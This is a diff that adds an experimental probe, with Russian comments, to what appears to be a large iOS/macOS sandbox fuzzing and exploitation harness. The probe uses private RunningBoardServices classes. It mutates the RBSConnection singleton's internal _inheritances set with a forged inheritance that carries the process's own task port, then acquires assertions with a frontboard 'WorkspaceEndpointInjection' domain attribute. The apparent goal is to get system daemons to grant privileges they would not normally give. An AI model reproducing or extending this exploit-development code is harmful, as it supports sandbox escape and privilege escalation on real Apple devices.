@@ -41786,6 +41786,149 @@ static void p_bq76(void) {
     LOG("[bq76] фоновый запуск...");
 }
 
+// p_bq77 — v228: INHERITANCE через RBSDomainAttribute (модель
+// InputUI: domain=frontboard, name=WorkspaceEndpointInjection).
+// v227-ос-лог: LegacyAttribute не запускает наследование —
+// домен-атрибут даёт «Saved endowment grant» → «Inheritance
+// changeset gained». План: добавить RBSInheritance в _inheritances
+// + acquire с DomainAttribute → демон зарегистрирует.
+static void p_bq77(void) {
+    LOG("[bq77] v228: inheritance через DomainAttribute");
+    fsync(fileno(stderr));
+    dispatch_queue_t q = dispatch_queue_create("bq77.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq77] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) { LOG("[bq77] CONTROL FAILED (§144)"); return; }
+    dlopen("/System/Library/PrivateFrameworks/RunningBoardServices"
+           ".framework/RunningBoardServices", RTLD_LAZY | RTLD_LOCAL);
+    fsync(fileno(stderr));
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+    @try {
+        Class cCls = NSClassFromString(@"RBSConnection");
+        Class iCls = NSClassFromString(@"RBSInheritance");
+        Class tCls = NSClassFromString(@"RBSTarget");
+        Class aCls = NSClassFromString(@"RBSAssertion");
+        Class dCls = NSClassFromString(@"RBSDomainAttribute");
+        LOG("[bq77] классы: conn=%p inh=%p t=%p a=%p dom=%p",
+            cCls, iCls, tCls, aCls, dCls);
+        if (!cCls || !iCls || !tCls || !aCls || !dCls) {
+            LOG("[bq77] нет классов"); return;
+        }
+
+        // 1) живой синглтон + добавить inheritance
+        typedef id (*SIFn)(Class, SEL);
+        SIFn sif = (SIFn)objc_msgSend;
+        id conn = sif(cCls, @selector(sharedInstance));
+        Ivar inhIvar = class_getInstanceVariable([conn class],
+                                                 "_inheritances");
+        id inhSet = object_getIvar(conn, inhIvar);
+        LOG("[bq77] _inheritances count=%lu",
+            (unsigned long)(inhSet ? [inhSet count] : 0));
+
+        // наш RBSInheritance (§221)
+        mach_port_t self_port = mach_task_self_;
+        NSData *endow = [NSData dataWithBytes:&self_port length:8];
+        SEL iiSel = NSSelectorFromString(
+            @"_initWithNamespace:environment:encodedEndowment:"
+            "originatingIdentifier:attributePath:");
+        id inh = nil;
+        if ([iCls instancesRespondToSelector:iiSel]) {
+            typedef id (*IFn)(id, SEL, NSString *, NSString *,
+                              NSData *, NSString *, NSString *);
+            IFn f = (IFn)objc_msgSend;
+            inh = f([iCls alloc], iiSel,
+                    @"com.apple.boardservices.endpoint-injection",
+                    @"(none)", endow, @"bq77", @"");
+        }
+        LOG("[bq77] inh=%p", inh);
+
+        // 2) добавить в _inheritances
+        if (inh && inhSet && [inhSet isKindOfClass:[NSMutableSet class]]) {
+            [(NSMutableSet *)inhSet addObject:inh];
+            LOG("[bq77] *** ДОБАВЛЕН в _inheritances (count=%lu) ***",
+                (unsigned long)[inhSet count]);
+        }
+
+        // 3) DomainAttribute (модель InputUI)
+        typedef id (*CFn)(Class, SEL);
+        CFn cf = (CFn)objc_msgSend;
+        id tgt = cf(tCls, @selector(currentProcess));
+        SEL domSel = @selector(attributeWithDomain:name:);
+        id domAttr = nil;
+        if ([dCls respondsToSelector:domSel]) {
+            typedef id (*DFn)(Class, SEL, NSString *, NSString *);
+            DFn df = (DFn)objc_msgSend;
+            domAttr = df(dCls, domSel,
+                         @"com.apple.frontboard",
+                         @"WorkspaceEndpointInjection");
+            LOG("[bq77] DomainAttribute=%p", domAttr);
+        }
+
+        // 4) acquire с DomainAttribute (+inheritance в conn)
+        if (domAttr) {
+            typedef id (*IFn)(id, SEL, NSString *, id, NSArray *);
+            IFn f2 = (IFn)objc_msgSend;
+            id as = f2([aCls alloc],
+                @selector(initWithExplanation:target:attributes:),
+                @"bq77 domain-inh", tgt, @[domAttr]);
+            NSError *err = nil;
+            typedef BOOL (*AFn2)(id, SEL, NSError **);
+            AFn2 aq = (AFn2)objc_msgSend;
+            BOOL ok = aq(as, @selector(acquireWithError:), &err);
+            LOG("[bq77] *** acquire(Domain+inh) -> %d err=%s ***",
+                (int)ok, err ? err.localizedDescription.UTF8String
+                             : "(none)");
+            fsync(fileno(stderr));
+            sleep(3);
+            SEL vldSel = @selector(isValid);
+            BOOL vld = [as respondsToSelector:vldSel]
+                ? ((BOOL (*)(id, SEL))objc_msgSend)(as, vldSel) : NO;
+            LOG("[bq77] +3s valid=%d", (int)vld);
+            // убрать inheritance и инвалидируем
+            if (inhSet && [inhSet isKindOfClass:[NSMutableSet class]])
+                [(NSMutableSet *)inhSet removeObject:inh];
+            [as invalidate];
+        }
+
+        // 5) acquire с DomainAttribute БЕЗ inheritance (контроль:
+        //    может, Domain-атрибут сам по себе запускает механизм)
+        if (domAttr) {
+            id tgt5 = cf(tCls, @selector(currentProcess));
+            typedef id (*IFn)(id, SEL, NSString *, id, NSArray *);
+            IFn f3 = (IFn)objc_msgSend;
+            id as5 = f3([aCls alloc],
+                @selector(initWithExplanation:target:attributes:),
+                @"bq77 domain-only-ctl", tgt5, @[domAttr]);
+            NSError *err5 = nil;
+            typedef BOOL (*AFn2)(id, SEL, NSError **);
+            AFn2 aq5 = (AFn2)objc_msgSend;
+            BOOL ok5 = aq5(as5, @selector(acquireWithError:), &err5);
+            LOG("[bq77] acquire(Domain-соло КОНТРОЛЬ) -> %d err=%s",
+                (int)ok5, err5 ? err5.localizedDescription.UTF8String
+                               : "(none)");
+            [as5 invalidate];
+        }
+
+        LOG("[bq77] done — ос-лог: 'Saved endowment grant' или "
+            "'Inheritance changeset' от нашего pid?");
+    } @catch (NSException *e) {
+        LOG("[bq77] ИСКЛ: %s — %s", e.name.UTF8String ?: "?",
+            e.reason ? e.reason.UTF8String : "?");
+    }
+    });
+    LOG("[bq77] фоновый запуск...");
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -49288,6 +49431,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ74")) { p_bq74(); LOG("[probe13] bq74-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ75")) { p_bq75(); LOG("[probe13] bq75-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ76")) { p_bq76(); LOG("[probe13] bq76-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ77")) { p_bq77(); LOG("[probe13] bq77-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
